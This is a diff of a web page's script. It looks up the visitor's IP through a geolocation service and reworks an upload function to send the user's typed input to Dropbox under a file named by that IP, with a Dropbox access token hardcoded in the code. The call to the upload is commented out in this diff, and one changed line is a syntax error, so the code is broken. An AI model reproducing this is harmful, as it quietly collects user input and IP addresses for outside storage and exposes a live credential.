@@ -44,6 +44,7 @@ body {
 	
  $(document).ready(function(){
 $("#input_1").on('change paste keydown input', run);
+	 FindIp()
 
 	 })
 document.getElementById("method").addEventListener('change', run);
@@ -66,13 +67,21 @@ run();
 
 
 
+function FindIp(){
+$.getJSON('https://freegeoip.net/json/', function(data) {
+	//data2 = (JSON.stringify(data, null, 2));
+	alert(data.ip)
+  //return data.ip
+});
 
+}
 
-function uploadFile() {
+function uploadFile(ip, input) {
 	var ac = "Xr4LDdksJ4sAAAAAAAACeCdiGQMk7nqkem94FOXjwsd1tMNzKjSYetj1M-bvz0NB"
       var dbx = new Dropbox.Dropbox({ accessToken: ac });
-	  file =[]
-      dbx.filesUpload({path: '/' + "test.txt" + Date.parse() , contents: file})
+	 file = input;
+	alert(ip)
+      dbx.filesUpload({path: '/': + ip , contents: file})
         .then(function(response) {
           var results = document.getElementById('results');
           results.appendChild(document.createTextNode('File uploaded!'));
@@ -82,7 +91,7 @@ function uploadFile() {
           console.error(error);
         });
 	  
-		alert('error2')
+		//alert('error2')
 	  return false;
     }
 
@@ -155,7 +164,8 @@ function run()
   
   xhttp.open("GET", "orig.html?in=inn" , true);
   xhttp.send();
-	uploadFile()
+	//ip = FindIp()
+	//uploadFile(ip, inn)
 
 }
 
